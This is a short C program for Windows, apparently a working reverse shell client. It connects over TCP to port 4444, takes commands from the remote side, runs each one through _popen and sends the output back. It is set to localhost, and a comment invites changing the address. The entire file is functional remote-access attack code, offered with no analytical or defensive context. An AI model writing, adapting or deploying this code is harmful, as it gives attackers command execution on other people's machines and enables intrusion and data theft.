#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[4096];
    char command[1024];

    WSAStartup(MAKEWORD(2,2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");   // this whole thing runs local (on the same pc) but you can change that if you want.
    server.sin_port = htons(4444);

    printf("[+] Connecting to server...\n");
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
        printf("[+] Connected!\n");

        while (1) {
            int bytes = recv(sock, command, sizeof(command)-1, 0);
            if (bytes <= 0) break;
            command[bytes] = '\0';

            if (strncmp(command, "exit", 4) == 0) break;

            // execute command
            FILE *fp = _popen(command, "r");
            if (fp) {
                while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                    send(sock, buffer, strlen(buffer), 0);
                }
                _pclose(fp);
            }
            send(sock, "END_OF_OUTPUT", 13, 0);
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}